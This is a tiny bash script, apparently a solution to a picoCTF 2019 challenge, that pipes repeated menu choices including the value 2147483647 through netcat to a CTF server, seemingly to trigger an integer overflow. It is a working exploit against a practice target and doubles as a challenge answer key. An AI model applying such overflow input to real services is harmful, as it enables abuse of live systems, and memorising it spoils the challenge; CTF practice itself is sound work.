#!/bin/bash

{
for i in {1..110}
do
	echo 2;
	echo 1;
	echo 2147483647;
done

echo 2;
echo 2;
echo 1;

} | nc 2019shell1.picoctf.com 14937
